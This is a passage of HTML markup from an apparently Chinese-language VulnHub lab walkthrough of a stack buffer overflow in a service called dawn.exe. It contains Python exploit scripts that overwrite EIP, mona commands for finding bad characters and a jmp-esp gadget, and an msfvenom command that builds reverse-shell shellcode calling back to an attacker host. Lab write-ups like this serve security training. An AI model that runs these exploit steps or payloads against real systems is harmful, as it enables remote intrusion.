&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#34;B&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buffer = &lt;span style="color:#cd5555">&amp;#34;C&amp;#34;&lt;/span> * (&lt;span style="color:#b452cd">800&lt;/span>-&lt;span style="color:#658b00">len&lt;/span>(buff) - &lt;span style="color:#658b00">len&lt;/span>(eip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + buffer + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/6.webp" alt="6">&lt;/p>
&lt;p>测试后长度应该够写入shellcode的&lt;/p>
&lt;h4 id="查找坏字符">📌查找坏字符&lt;/h4>
&lt;p>生成全字符&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>!mona bytearray -cpb &lt;span style="color:#cd5555">\x&lt;/span>&lt;span style="color:#b452cd">00&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/7.webp" alt="7">&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>badchars = (&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#34;B&amp;#34;&lt;/span> * &lt;span style="color:#b452cd">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buffer = badchars
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + buffer + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/8.webp" alt="8">&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">!&lt;/span>mona compare -a esp -f &lt;span style="color:#cd5555">&amp;#34;D:\Program Files\Immunity Inc\Immunity Debugger&lt;/span>&lt;span style="color:#cd5555">\b&lt;/span>&lt;span style="color:#cd5555">ytearray.bin&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现无坏字符&lt;/p>
&lt;h4 id="找位置">📌找位置&lt;/h4>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>!mona modules
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/9.webp" alt="9">&lt;/p>
&lt;p>找出全false的进程文件dawn.exe&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msf-nasm_shell
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nasm &amp;gt; jmp esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b452cd">00000000&lt;/span> FFE4 jmp esp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>同理&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">!&lt;/span>mona find -s &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xff\xe4&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -m &lt;span style="color:#cd5555">&amp;#34;dawn.exe&amp;#34;&lt;/span> &lt;span style="color:#228b22">#jmp esp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">!&lt;/span>mona find -s &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x54\xc3&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -m &lt;span style="color:#cd5555">&amp;#34;dawn.exe&amp;#34;&lt;/span> &lt;span style="color:#228b22">#PUSH ESP; RET&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a61717;background-color:#e3d2d2">!&lt;/span>mona find -s &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\xff\xd4&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span> -m &lt;span style="color:#cd5555">&amp;#34;dawn.exe&amp;#34;&lt;/span> &lt;span style="color:#228b22">#CALL ESP&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/10.webp" alt="10">&lt;/p>
&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/11.webp" alt="11">&lt;/p>
&lt;p>使用&lt;code>!mona find -s &amp;quot;\x54\xc3&amp;quot; -m &amp;quot;dawn.exe&amp;quot;&lt;/code>时找到34581777&lt;/p>
&lt;p>倒序&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b452cd">34581777&lt;/span> → &lt;span style="color:#b452cd">77&lt;/span> &lt;span style="color:#b452cd">17&lt;/span> &lt;span style="color:#b452cd">58&lt;/span> &lt;span style="color:#b452cd">34&lt;/span> → &lt;span style="color:#cd5555">\x&lt;/span>77&lt;span style="color:#cd5555">\x&lt;/span>17&lt;span style="color:#cd5555">\x&lt;/span>58&lt;span style="color:#cd5555">\x&lt;/span>34s
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#!/usr/bin/python2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">import&lt;/span> &lt;span style="color:#008b45;text-decoration:underline">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip = &lt;span style="color:#cd5555">&amp;#34;10.0.2.14&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port = &lt;span style="color:#b452cd">1985&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buff = &lt;span style="color:#cd5555">&amp;#34;A&amp;#34;&lt;/span>*&lt;span style="color:#b452cd">272&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip = &lt;span style="color:#cd5555">&amp;#39;&lt;/span>&lt;span style="color:#cd5555">\x77\x17\x58\x34&lt;/span>&lt;span style="color:#cd5555">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nullByte = &lt;span style="color:#cd5555">&amp;#34;&lt;/span>&lt;span style="color:#cd5555">\x00&lt;/span>&lt;span style="color:#cd5555">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>buffer = &lt;span style="color:#cd5555">&amp;#34;C&amp;#34;&lt;/span> * (&lt;span style="color:#b452cd">800&lt;/span>-&lt;span style="color:#658b00">len&lt;/span>(buff) - &lt;span style="color:#658b00">len&lt;/span>(eip))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>inputBuffer = buff + eip + buffer + nullByte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.connect((ip, port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s.send(inputBuffer)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/424/12.webp" alt="12">&lt;/p>
&lt;h4 id="生成shellcode">📌生成shellcode&lt;/h4>
&lt;p>使用Kali监听444端口&lt;/p>
&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22"># Windows&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ msfvenom -p windows/shell_reverse_tcp &lt;span style="color:#00688b">LHOST&lt;/span>=10.0.2.15 &lt;span style="color:#00688b">LPORT&lt;/span>=&lt;span style="color:#b452cd">444&lt;/span> -f c -b &lt;span style="color:#cd5555">&amp;#34;\x00\x0A\x0D\x25\x26\x2B\x3D&amp;#34;&lt;/span> &lt;span style="color:#00688b">EXITFUNC&lt;/span>=thread
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
